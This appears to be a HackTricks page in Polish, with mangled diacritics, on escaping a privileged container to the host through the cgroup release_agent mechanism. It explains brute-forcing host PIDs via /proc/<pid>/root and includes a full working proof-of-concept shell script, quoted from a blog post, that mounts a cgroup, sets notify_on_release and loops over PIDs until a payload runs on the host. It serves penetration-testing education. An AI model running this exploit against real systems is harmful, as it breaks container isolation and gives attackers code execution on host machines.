<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>

Aby uzyska dalsze szczeg贸y, **sprawd藕 wpis na blogu z [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**. Oto tylko streszczenie:

Technika opisuje metod **wykonywania kodu hosta z poziomu kontenera**, pokonujc wyzwania wynikajce z konfiguracji sterownik贸w magazynu, kt贸re utrudniaj cie偶k systemu plik贸w kontenera na hocie, takie jak Kata Containers lub konkretne ustawienia `devicemapper`.

Kluczowe kroki:

1. **Lokalizacja identyfikator贸w proces贸w (PID):** Za pomoc symbolicznego cza `/proc/<pid>/root` w pseudosystemie plik贸w Linuxa mo偶na uzyska dostp do dowolnego pliku wewntrz kontenera w odniesieniu do systemu plik贸w hosta. Pozwala to omin konieczno znajomoci cie偶ki systemu plik贸w kontenera na hocie.
2. **Brute Force PID:** Wykorzystuje si podejcie brute force do przeszukiwania PID-贸w na hocie. Polega to na sekwencyjnym sprawdzaniu obecnoci okrelonego pliku w `/proc/<pid>/root/<file>`. Gdy plik zostanie znaleziony, oznacza to, 偶e odpowiadajcy PID nale偶y do procesu uruchomionego wewntrz docelowego kontenera.
3. **Wywoanie wykonania:** Zgadywana cie偶ka PID jest zapisywana w pliku `release_agent` grupy cgroups. To dziaanie wywouje wykonanie `release_agent`. Sukces tego kroku jest potwierdzany przez sprawdzenie utworzenia pliku wynikowego.

### Proces eksploatacji

Proces eksploatacji obejmuje bardziej szczeg贸owy zestaw dziaa, majcych na celu wykonanie adunku na hocie poprzez zgadywanie poprawnego PID procesu uruchomionego wewntrz kontenera. Oto jak to si odbywa:

1. **Inicjalizacja rodowiska:** Na hocie przygotowywany jest skrypt adunku (`payload.sh`), a tworzony jest unikalny katalog do manipulacji grup cgroups.
2. **Przygotowanie adunku:** Tworzony jest skrypt adunku, kt贸ry zawiera polecenia do wykonania na hocie, i jest on nadawany uprawnienia do wykonania.
3. **Konfiguracja grupy cgroups:** Grupa cgroups jest montowana i konfigurowana. Ustawiana jest flaga `notify_on_release`, aby zapewni wykonanie adunku po zwolnieniu grupy cgroups.
4. **Brute Force PID:** Ptla iteruje przez potencjalne PID-y, zapisujc ka偶dy zgadywany PID w pliku `release_agent`. Efektem tego jest ustawienie skryptu adunku jako `release_agent`.
5. **Wywoanie i sprawdzenie wykonania:** Dla ka偶dego PID-u zapisywane jest `cgroup.procs` grupy cgroups, co powoduje wykonanie `release_agent`, jeli PID jest poprawny. Ptla trwa, dop贸ki nie zostanie znaleziony wynikowy plik skryptu adunku, co oznacza udane wykonanie.

PoC z wpisu na blogu:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
